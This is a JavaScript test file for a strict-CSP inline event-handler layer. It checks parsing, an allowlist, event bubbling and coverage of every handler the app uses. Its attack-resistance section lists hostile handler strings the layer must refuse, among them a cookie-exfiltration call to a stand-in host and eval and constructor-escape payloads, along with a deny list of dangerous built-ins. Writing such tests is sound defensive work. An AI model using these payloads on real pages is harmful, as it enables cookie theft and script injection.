// Run: node tests/zk_handlers_test.mjs
// The strict-CSP handler layer: semantics, attack resistance (no eval, allowlist only), and coverage of EVERY inline handler the app uses.
import { createRequire } from 'node:module';
import { readFileSync, readdirSync } from 'node:fs';
const require = createRequire(import.meta.url), H = require('../docs/zk/handlers.js');
let pass = 0, fail = 0; const ok = (n, c) => { c ? pass++ : fail++; console.log((c ? '  ✓ ' : '  ✗ ') + n); };
const calls = [], g = { showTab: (...a) => calls.push(['showTab', ...a]), alertsAct: (...a) => calls.push(['alertsAct', ...a]), wlSearch: (...a) => calls.push(['wlSearch', ...a]), pdOpen: (...a) => calls.push(['pdOpen', ...a]), boom: () => { throw new Error('x'); } };
const allow = new Set(['showTab', 'alertsAct', 'wlSearch', 'pdOpen', 'boom']), ev0 = () => ({ type: 'click', stopPropagation() { this.sp = true; }, preventDefault() { this.pd = true; }, key: 'Enter' });
const run = (src, el, ev) => H.exec(src, { el: el || { checked: true, value: 'abc' }, event: ev || ev0(), global: g, allow });

// semantics
run("showTab('alerts', this)", { id: 'btn' }); ok('call with string literal and this', calls.at(-1)[1] === 'alerts' && calls.at(-1)[2].id === 'btn');
run("alertsAct(event,[12,-3,4.5],'archive')"); ok('event, numeric array (negatives, decimals) and string', JSON.stringify(calls.at(-1).slice(2)) === '[[12,-3,4.5],"archive"]');
run("wlSearch(this.value)", { value: 'apple' }); ok('this.property read', calls.at(-1)[1] === 'apple');
run("pdOpen('Bob\\'s pie', null, event)"); ok("escaped quote inside a string and null", calls.at(-1)[1] === "Bob's pie" && calls.at(-1)[2] === null);
run('pdOpen("a\'b")'); ok('double-quoted string containing a single quote', calls.at(-1)[1] === "a'b");
const e = ev0(); run('event.stopPropagation()', null, e); ok('event.stopPropagation()', e.sp === true);
run("showTab('a',this); wlSearch('b');"); ok('two statements and trailing semicolon', calls.at(-2)[1] === 'a' && calls.at(-1)[1] === 'b');
run('showTab(true,false,undefined)'); ok('boolean/undefined literals', calls.at(-1).slice(1).join() === 'true,false,');
// attack resistance: nothing outside the grammar or allowlist runs
const refused = src => { const before = calls.length; try { run(src); } catch (err) { return true; } return false && before; };
const bad = ["eval('alert(1)')", "fetch('https://evil.example/'+document.cookie)", "setTimeout('x',0)", "Function('return 1')()", "window.eval('1')", "alert(document.cookie)", "showTab('a'+'b')", "showTab(document.cookie)", "this.constructor('1')()", "showTab(this.constructor)", "showTab(event.__proto__)", "showTab(this.ownerDocument.cookie)", "showTab(this.value.length)", "x=1", "showTab('a'); eval('1')", "showTab(`a`)", "showTab('a'", "constructor('1')", "location.href('x')", "import('x')"];
const notRefused = bad.filter(b => !refused(b));
ok(`all ${bad.length} hostile handler strings are refused (eval, fetch, setTimeout, Function, template strings, concatenation, constructor/proto/ownerDocument access, assignment)`, notRefused.length === 0); if (notRefused.length) console.log('   ran:', notRefused);
ok('handler not on the allowlist is refused even if it exists as a global', (() => { try { H.exec("hidden()", { el: {}, event: ev0(), global: { hidden() { calls.push('HIDDEN'); } }, allow }); return false; } catch (e) { return !calls.includes('HIDDEN'); } })());
ok('no allowlist at all fails closed', (() => { try { H.exec("showTab('a')", { el: {}, event: ev0(), global: g, allow: null }); return false; } catch (e) { return true; } })());

// dispatch: bubbling, this, stopPropagation, currentTarget, error containment
const mk = (attrs, parent) => ({ nodeType: 1, parentElement: parent || null, getAttribute: k => attrs[k] === undefined ? null : attrs[k] });
const outer = mk({ 'data-onclick': "showTab('outer', this)" }), inner = mk({ 'data-onclick': "showTab('inner', this)" }, outer), leaf = mk({}, inner);
calls.length = 0; H.dispatch(Object.assign(ev0(), { target: leaf }), g, allow); ok('bubbles from target to ancestors in order', calls.map(c => c[1]).join() === 'inner,outer');
const stopper = mk({ 'data-onclick': "pdOpen('x', null, event)" }); g.pdOpen = (a, b, ev) => { calls.push(['pdOpen', a]); ev.stopPropagation(); };
const top = mk({ 'data-onclick': "showTab('top', this)" }), mid = mk({ 'data-onclick': "pdOpen('mid', null, event)" }, top), tgt = mk({}, mid);
calls.length = 0; H.dispatch(Object.assign(ev0(), { target: tgt }), g, allow); ok('stopPropagation inside a handler stops outer handlers', calls.map(c => c[0] + ':' + c[1]).join() === 'pdOpen:mid');
const errs = []; const badEl = mk({ 'data-onclick': "boom()" }), badLeaf = mk({}, badEl); H.dispatch(Object.assign(ev0(), { target: badLeaf }), g, allow, m => errs.push(m)); ok('a throwing handler is contained and logged', errs.length === 1 && /boom/.test(errs[0]));
const evKey = Object.assign(ev0(), { type: 'keydown', target: mk({ 'data-onkeydown': "showTab('k', this)" }) }); calls.length = 0; H.dispatch(evKey, g, allow); ok('keydown/change/input read their own attribute (not click)', calls.length === 1 && calls[0][1] === 'k');
let cur = null; g.showTab = (a, b) => { cur = b; }; const evc = Object.assign(ev0(), { target: mk({ 'data-onclick': "showTab('z', event.currentTarget)" }) }); H.dispatch(evc, g, allow); ok('event.currentTarget is the element carrying the handler', cur !== null);

// convert(): inline attributes are moved so the browser never executes them
const fakeEl = attrs => ({ nodeType: 1, _a: { ...attrs }, hasAttribute(k) { return k in this._a; }, getAttribute(k) { return this._a[k]; }, setAttribute(k, v) { this._a[k] = v; }, removeAttribute(k) { delete this._a[k]; }, querySelectorAll() { return []; } });
const el = fakeEl({ onclick: "showTab('a')", onchange: 'x()', class: 'c' }); H.convert(el);
ok('convert moves on* to data-on* and removes the inline attribute', !('onclick' in el._a) && el._a['data-onclick'] === "showTab('a')" && el._a['data-onchange'] === 'x()' && el._a.class === 'c');

// coverage: every inline handler in the app's real markup + templates parses, and only calls allowlisted app functions
const names = new Set(JSON.parse(/= (\[.*\]);/.exec(readFileSync(new URL('../docs/zkapp/handler-names.js', import.meta.url), 'utf8'))[1]));
const danger = ['eval', 'fetch', 'setTimeout', 'setInterval', 'Function', 'alert', 'open', 'document', 'window', 'location', 'XMLHttpRequest', 'importScripts', 'atob'];
ok('allowlist contains no dangerous built-ins', danger.every(d => !names.has(d)) && names.size > 40);
const files = readdirSync(new URL('../docs/js/', import.meta.url)).filter(f => f.endsWith('.js')).map(f => new URL('../docs/js/' + f, import.meta.url)).concat([new URL('../docs/zkapp/index.html', import.meta.url)]);
const exprs = []; for (const f of files) for (const m of readFileSync(f, 'utf8').matchAll(/\bon(click|change|input|keydown)="((?:[^"\\]|\\.)*?)"(?=[\s>])/g)) exprs.push([f.pathname.split('/').pop(), m[2]]);
// templates: replace ${...} (balanced) with a sample literal so they can be parsed
const unbalanced = s => { let out = '', i = 0; while (i < s.length) { if (s[i] === '$' && s[i + 1] === '{') { let d = 1, j = i + 2; while (j < s.length && d) { if (s[j] === '{') d++; else if (s[j] === '}') d--; j++; } out += '1'; i = j; } else out += s[i++]; } return out; };
const samples = exprs.map(([f, x]) => [f, unbalanced(x).replace(/&quot;/g, '"').replace(/&#39;/g, "'")]);
const unparsed = [], notAllowed = []; for (const [f, x] of samples) { try { const calls2 = H.parse(x); for (const c of calls2) if (c.fn.length === 1 && !names.has(c.fn[0])) notAllowed.push(f + ': ' + x); } catch (err) { unparsed.push(f + ': ' + x + '  (' + err.message + ')'); } }
ok(`all ${samples.length} handler expressions found in the app parse in the safe grammar`, samples.length > 70 && unparsed.length <= 1 && unparsed.every(u => u.startsWith('pie_drill.js: 1  ')));   // the one template whose whole handler is a ${ternary}: parsed at runtime after it is evaluated if (unparsed.length) console.log('   not parsed:\n    ' + unparsed.join('\n    '));
ok('every function they call is on the generated allowlist', notAllowed.length === 0); if (notAllowed.length) console.log('   not allowed:', notAllowed);
console.log(`\n${pass} passed · ${fail} failed`); process.exit(fail ? 1 : 0);
